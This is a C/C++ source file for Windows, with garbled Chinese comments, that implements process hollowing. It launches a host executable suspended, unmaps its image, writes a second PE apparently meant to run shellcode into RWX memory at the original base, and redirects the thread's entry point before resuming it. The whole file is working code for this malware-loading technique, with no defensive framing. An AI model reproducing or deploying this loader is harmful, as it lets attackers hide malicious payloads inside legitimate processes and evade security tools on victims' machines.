#include<windows.h>
#include<TlHelp32.h>
#include<tchar.h>
#include<stdio.h>

char container_path[MAX_PATH] = "C:\\Users\\86175\\source\\repos\\ConsoleApplication11\\ConsoleApplication11\\body.exe";                  //��ע��Ŀ��ܽ���
char content_path[MAX_PATH] = "C:\\Users\\86175\\source\\repos\\ConsoleApplication11\\ConsoleApplication11\\w32-exe-run-shellcode.exe";//ע��Ľ���

int CreateProc(char*, PROCESS_INFORMATION*);//�������ܽ���
int UnmapView(PROCESS_INFORMATION);//ж�ؿ��ܽ����ڴ�ӳ��
int Injection(PROCESS_INFORMATION);//ʵ��ע��
DWORD GetImageSize(char*);//��ȡSizeOfImage
DWORD GetEntryPoint();//��ȡOEP
DWORD GetImageBase(PROCESS_INFORMATION pi);//��ȡ��ַ
DWORD GetImageBase();//��ȡ��ַ

CONTEXT context;//�����߳������Ľṹ
HANDLE hfile;//Ҫע����ļ��ľ��
char* pBuffer;//���ļ������ڴ��ָ��

void main()
{
	PROCESS_INFORMATION pi;
	if (!CreateProc(container_path, &pi))//�������ܽ���
		return;

	if (UnmapView(pi) != 0)//ж��ӳ��
		return;

	if (Injection(pi) == 0)//ʵ��ע��
		return;
}

int CreateProc(char* path, PROCESS_INFORMATION* pi)
{
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));//��ʼ��Ϊ0
	si.cb = sizeof(si);
	ZeroMemory(pi, sizeof(pi));
	return CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi);//�Թ���ķ�ʽ��������
}

int UnmapView(PROCESS_INFORMATION pi)
{
	typedef NTSTATUS(WINAPI* ZwUnmapViewOfSection)(HANDLE, LPVOID);//���庯��ָ�� 
	ZwUnmapViewOfSection UnmapViewOfSection = (ZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "ZwUnmapViewOfSection");//��ȡ������ַ
	context.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &context);//��ȡ�߳�������
	DWORD base;
	ReadProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &base, sizeof(DWORD), NULL);//��ȡ���ܽ��̻�ַ
	return UnmapViewOfSection(pi.hProcess, (LPVOID)base);//ж�ؿ��ܽ���ӳ��
}

int Injection(PROCESS_INFORMATION pi)
{

	DWORD result = 0;
	DWORD sizeImage = GetImageSize(content_path);//��ȡҪע����̵�ImageSize
	DWORD ImageBase = GetImageBase();//��ȡIMageBase
	context.Eax = (GetEntryPoint() + ImageBase);//��ȡҪע��Ľ��̵���ڵ�,eax�б�������ڵ�
	VirtualAllocEx(pi.hProcess, (LPVOID)ImageBase, sizeImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//�ڿ��ܽ���������Ҫע��Ľ�������Ҫ�Ŀռ��С��ע����ע������ݵ�ImageBaseΪ��ַ�������Ͳ����޸��ض�λ��IAT
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImageBase, pBuffer, PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer)->OptionalHeader.SizeOfHeaders, NULL))//��Ҫע���HEADERӳ�䵽���ܽ���
	{
		return result;
	}

	PIMAGE_SECTION_HEADER psection = IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer));
	for (DWORD i = 0; i < PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer)->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ImageBase + psection->VirtualAddress), pBuffer + psection->PointerToRawData, psection->SizeOfRawData, NULL))//��Ҫע�������ӳ�䵽���ܽ���
		{
			return result;
		}
		++psection;
	}

	if (!WriteProcessMemory(pi.hProcess, (BYTE*)context.Ebx + 8, &ImageBase, sizeof(DWORD), NULL))//��Ҫע����޸��߳��������е�ImageBase
	{
		return result;
	}

	SetThreadContext(pi.hThread, &context);//�����޸ĺ���߳�������
	ResumeThread(pi.hThread);//�ָ��߳�
	result = 1;
	return result;
}

DWORD GetImageSize(char* path)//�����ļ����ڴ�
{
	DWORD result = 0;
	hfile = CreateFileA(content_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //��Ҫע����ļ�
	if (hfile != INVALID_HANDLE_VALUE)
	{
		DWORD filesize = GetFileSize(hfile, NULL);
		pBuffer = new char[filesize];
		ReadFile(hfile, pBuffer, filesize, &filesize, NULL);
		PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
		if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
			result = pNtHeaders->OptionalHeader.SizeOfImage; //����PE�ṹ�õ�SizeOfImage
		}
	}
	return result;
}

DWORD GetEntryPoint()
{
	DWORD result = 0;
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return  result;
	}
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	result = OptionalHeader->AddressOfEntryPoint; //����PE�ṹ�õ�AddressOfEntryPoint

	return result;
}

DWORD GetImageBase()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->ImageBase;//��PE�ṹ�ҵ�ImageBase //400000 //ASLR
}